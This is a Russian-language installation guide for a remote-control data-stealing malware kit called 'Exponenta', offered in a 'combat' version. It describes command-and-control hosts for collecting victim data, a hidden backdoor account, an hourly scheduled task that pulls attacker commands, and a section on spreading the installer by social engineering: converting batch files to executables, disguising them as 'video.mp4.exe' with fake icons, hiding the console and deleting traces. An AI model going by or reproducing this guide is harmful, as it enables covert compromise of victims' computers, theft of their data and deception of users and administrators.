# Инсталляция стайлера «Экспонента»

В данном каталоге содержатся дистрибутивы, необходимые для установки
HTTP версии стайлера. Представлены вариантя для оффлайн и онлайн установки. Данные файлы можно использовать как в академическом, так и «боевом» варианте стайлера. Все дистрибутивы рабочие, но пока не тестировались.

## Принцип работы программы

После инсталляции файлов стайлера в системном окружении операционной
системы появляются следующие переменные:

  - *Hacker\_User* – имя (логин) учётной записи компьютера-жертвы на ftp
    серверах хозяина, с которых будет осуществляться управление
    стайлером
  - *Hacker\_Pass* – пароль для этой учётной записи. Его нужно
    указывать, чтобы посторонние не имели доступа к данным
    жертвы на сервере хозяина. Внимание\! Пароль храниться в
    незащищённом виде\! Просто автор не нашёл способа безопасного
    использования хеша и солей в программах коммуникации.
  - *Hacker\_host1* – доменное имя публичного хоста, с которого
    скачивается установочные файлы и публичные обновления
    стайлера. Её значение может совпадать со значением следующей
    переменной, когда используется только один хост.
  - *Hacker\_host2* – доменное имя приватного хоста, с которого
    скачиваются в офлайн-режиме команды управления стайлером и
    на который передаются результаты его работы

Также создаётся учётная запись с именем MSSQLSR для возможного
удалённого подключения к компьютеру, а также добавляется
задание для текущего пользователя на запуск каждый час файла
onsysload, в котором находятся текущие команды управления стайлером.

На приватном хосте создаются аккаунты пользователя-жертвы HTTP сервера. В
корень этого сервера будут «сваливаться» результаты работы стайлера на
компьютере-жертве, а в папке «webdav» будут расположены командные
файлы, загружаемые на компьютер-жертву для управления им.

Рабочая директория стайлера для компьютера-жертвы – c:\\pub1\\Util

При входе в аккаунт компьютера любого пользователя каждый час
запускается на обработку файл onsysload. В нём присутствуют
следующие обязательные части:

  - http загрузка команд для исполнения команд на компьютере-жертве
    (например, новый файл user\_hourly.bat или новый файл отправки
    данных)
  - Определение внешнего IP адреса компьютера в Интернете;
  - Переименование и отправка файла с IP адресом на сервер хозяина

## Исходные данные

Для установки стайлера "Экспонента" вам дополнительно потребуется
следующее рабочее окружение:

  - HTTP адрес публичного хостинга файлов стайлера. Он выбирается
    достаточно произвольно, главное — чтобы он предоставлял
    анонимный доступ. Хотя программисты могут изменить это условие.
    Доменное имя этого публичного хостинга указывается в переменной
    Hacker\_host1.
  - HTTP WebDAV адрес (хостинг, логин и пароль) — для управления компьютером
    жертвы. Создавать этот адрес необходимо согласно указанным выше
    принципам работы стайлера, включая иерархию каталогов и
    круглосуточную доступность сервиса.

Исходя из вышесказанного, определитесь, нужно ли Вам редактировать
командные файлы этого проекта, или всё оставить с настройками по
умолчанию. Если исправления Вам всё-таки нужны, внесите изменения в
клон данного проекта и пересоберите SFX файлы установки дистрибутива.

## Организация HTTP сервера Hacker\_host1

На HTTP сервере с доменным именем, сохранённой в переменной
Hacker\_host1, в его корне должна создана папка: "Exponenta". В ней
должны содержаться основной установщик стайлера, установщики
плагинов и программы-инсталляторы. Учтите, что все файлы,
расположенные в этом каталоге, будут скачены с сервера на компьютер
жертвы без каких-либо изменений\! Это значит, что там должны
располагаться только универсальные файлы, а кастомизация для
каждого пользователя должны проводиться отдельно при подготовке
инсталлятора.

Основным файлом, который устанавливает стайлер вместе с модулями и
плагинами, является файл: Install\_MainExponenta.bat Его пример
приведён в этой папке. Этот файл рабочий, и может использоваться для
локальной установки стайлера путём запуска этого файла из командной
строки с повышенными привилегиями. Для своей работы этот файл (в
текущей редакции) требует наличие в том же каталоге файлов:

  - ExponentaHTTPStylerMainFiles151SetupRePack.exe с основными файлами стайлера;
  - HiddenStart450SetupRePack.exe с плагином-пакетом Hidden Start;
  - ElevationExponentaPlugin202SetupRepack.exe с плагином-пакетом Elevation;
  - chock.install.cmd – командный файл с инсталлятором пакета Chocolatey
    for Windows;
  - choc\_pack.install.cmd – командный файл с инсталляцией
    дополнительных программ через менеджер пакетов;

Это минимальный рабочий набор инсталлятора. Он обязательно должен
присутствовать в каталоге Exponenta на сервере. Назначение других
дополнительных файлов будет написано ниже.

В этом же каталоге присутствуют файлы descript.ion,
INSTALL.MD, install1.md, install.rtf и install.html. Они несут только
информационную нагрузку, и для работы стайлера не требуются.

## Организация HTTP WebDAV сервера Hacker\_host2

WebDAV сервер с доменом Hacker\_host2 является запароленным сервером, на
котором должен обязательно присутствовать аккаунт с логином
Hacker\_User и паролем Hacker\_Pass (здесь указаны имена переменных,
вместо которых Вы должны использовать их корректные значения).

На этом сервере, в его корне, обязательно должна присутствовать папка
Private, в которой будут храниться файлы, с помощью которых ежечасно
выдаются на исполнение команды стайлера, выполняемые им офлайне. В
качестве обязательных, в этом наборе должны присутствовать файлы:

  - user\_hourly1.bat;
  - user\_dayly1.bat;
  - user\_onstart1.bat;
  - sendfile.cmd,
  - и обязательно должен *отсутствовать* файл **onsysload.bat**\!

Результаты выполнения команд стайлер пересылает при помощи файла
sendfile.cmd на сервер Hacker\_host2 в каталог «webdav» аккаунта
Hacker\_User. Будьте внимательны, этот каталог должен быть *открыт для
записи* авторизованному пользователю http-сервера по этому протоколу\!

*Примечание*. Хотя на одном хосте может располагаться управление более
чем одним стайлером, сочетание Hacker\_User/Hacker\_host2 должно быть
уникальным для всего Интернета\! Без этого условия стайлер работать не
будет.

# Создание дистрибутива для распространения методом социальной инженерии

Устанавливать файлы стайлера локально или через удалённый доступ — не
очень хорошая идея со всех сторон. Поскольку пакет для своей работы
требует Интернет, то и устанавливаться он должен также из Интернета.
Ниже будет рассказано, как подготовить файл для загрузки пакета из
Интернета и сокрытия установки методами социальной инженерии.

## Подготовка установочного файла

Для «нормальной» установки стайлера в этом каталоге присутствуют файлы:

  - load\_distrib.bat — общий для всех файл, скачивающий и
    устанавливающий файлы дистрибутива стайлера
    «Экспонента»;
  - load.bat — пример кастомизированного под конкретную жертву файл
    загрузки стайлера.

Назначение первого файла — это открытие портов для FTP клиента,
подготовки файла сценария и скачивание дистрибутива этим
клиентом, а также запуск локального установщика стайлера. Данные
для этого пакетный файл получает из командной строки.

Единственное назначение второго файла — это запуск первого файла с
заполненными по умолчанию параметрами кастомизации. Дело в том,
что запустить файл из Интернета с параметрами Вам будет
затруднительно, а с использованием методов социальной
инженерии — практически невозможно. Только для этого и создан этот
файл.

Формат этого файла следующий

    Echo off
    start load_distrib.bat «значение переменной Hacker_User» «значение переменной Hacker_Pass» «значение переменной Hacker_host1» «значение переменной Hacker_host2»

Теперь для запуска процесса инсталляции необходимо, чтобы оба файла
находились в одном каталоге, и нужно будет только запустить файл
load.bat с повышенными привилегиями. Один из вариантов, как это сделать
на практике, смотри ниже.

## Подготовка файла для пересылки на компьютер жертвы

Подготовленные таким образом файлы позволяют установить стайлер в любой
конфигурации на компьютер жертвы. Для этого достаточно запустить файл
`load.bat` (или как Вы его назвали) на компьютере жертвы из любого
каталога с повышенными привилегиями выполнения. Всё бы хорошо…
Только переслать файл с таким расширением на компьютер жертвы будет
проблематично, а запустить такой файл с повышенными привилегиями, в
реальных условиях пользователю будет практически невозможно.
Администратора такой файл насторожит, а многие лузеры вообще не
умеют запускать командные файлы.

К счастью для хакеров, есть программа для конверсии командных файлов в
обычные исполняемые файлы с расширением \*.exe. Для её установки
необходимо подать команду:

    choco install –y battoexeconverter

После установки необходимо запустить программу, открыть в её собственном
редакторе командный файл, задать опции конвертирования, конечный
каталог, и, бинго, будет создан исполняемый файл с той же
функциональностью.

Перечислять все опции и команды работы этого конвертера автор не будет –
это тема отдельной статьи. Нужно отметить, что данный файл после
конвертации сможет:

1.  Требовать своего запуска с повышенными привилегиями;
2.  Инкапсулировать в себя не только выполняемый командный файл, но и
    дополнительные командные и исполняемые файлы, архивы, видео,
    изображения, необходимые для его работы;
3.  Сменить иконку приложения, отображаемую в Windows и файловых
    менеджерах. Это позволит скрывать факт присутствия
    исполняемого файла в стайлере и позволяет файлу
    установщика стайлера «Экспонента» «притвориться»,
    например, изображением или файлом видео;
4.  Передавать указанный файл по ссылкам в социальных сетях или
    мессенджерах, а также электронной почте и других средствах
    обмена сообщениями между пользователями. Принципиальный момент
    здесь «по ссылке», поскольку многие программы обмена
    сообщениями не разрешают пересылать в своём теле
    командные и исполняемые файлы, как раз для предотвращения
    заражения. А переданный по ссылке командный файл нельзя ни
    скачать, ни запустить;
5.  Назначить файлу установщика любое имя, например, video.mp4.exe. Как
    правило, по умолчанию Microsoft Windows скрывает окончания
    исполняемых файлов. В этом случае, при соблюдении пункта 3,
    этот файл будет похож на файл видео, например, с танцующими
    свиньями, и лузер может просто не заметить подмену.
    Особенно, если в дополнение к стайлеру ему действительно
    будет скачено и показано видео с танцующими свиньями.
6.  Иметь любые размеры. Исполняемые файлы, конвертированные из
    командных, в зависимости от своего содержимого могут быть
    или очень маленькими, или очень большими, если инкапсулирует в
    себе видео. В любом случае небольшой размер файла не
    предполагает большого места на диске, и у пользователя
    или администратора создаётся ложное впечатление, что такая
    маленькая команда не сможет принести сколь-нибудь
    существенного вреда и не содержит в себе установщика.
    Что, на самом деле, не так;
7.  Запускать установку в скрытом режиме, не показывая окна консоли;
8.  Удалять после себя все файлы, которые были инкапсулированы в этот
    исполняемый файл;
9.  Назначать любой рабочий каталог для выполнения, в том числе каталог
    с временными файлами. В этом случае обнаружить его работу будет ещё
    труднее.

Таким образом, преобразовав командный файл установщика стайлера в
исполняемый файл, его можно будет переслать жертве по ссылке
вместе с побуждающим текстом: «Ну ка оцени, какое видео с
танцующими свиньями я откопал\!». По законам социальной
инженерии, весьма вероятно откроет такое видео не только офисный
лузер, но и его коллега – беспечный администратор. Не смотря на все
предупреждения специалистов охраны и компьютерной безопасности. А
нам то и надо\!

А организовать загрузку и запуск видео для «отвода глаз» Вам не составит
труда. Например, с помощью команд:

    Wget «ссылка на файл с видео»
    Start «файл видео»

Все эти команды присутствуют в базовом пакете стайлера.

## Назначение инсталляционных файлов

 - Файл indtall_distrib.bat служит для офлайновой установки файлов стайлера. В настоящее время используется только в тестовых целях или когда все файлы проекта инкапсулируются в одну приманку. Является общим для всего проекта.
 - Файл load_distrib -- основной файл загрузчика стайлера.  служит для того, чтобы загрузить файлы дистрибутива стайлера онлайн с сайта Hacker_Host1. Является общим для всего проекта.
 - Файл install.bat -- пример кастомизируемого файла для запуска файла install_distrib. Все параметры приведены только для примера, Вы должны их заменить своими значениями.
 - Файл load.bat -- пример кастомизируемого файла для запуска файла load_distrib.bat См. примечание к предыдущему файлу.
 - Файл duck-install.msi -- дистрибутив программы duck для подключения к облачным хранилищам из командной строки. В этой версии стайлера не используется, просто её официальный сайт заблокирован.
 - wget.ete. Программа для скачивания дистрибутивов, используемая в файле load_distrib. обязательно должна присутствовать в дистрибутиве стайлера, поскольку без неё скачивание дистрибутивов с сайта невозможно!
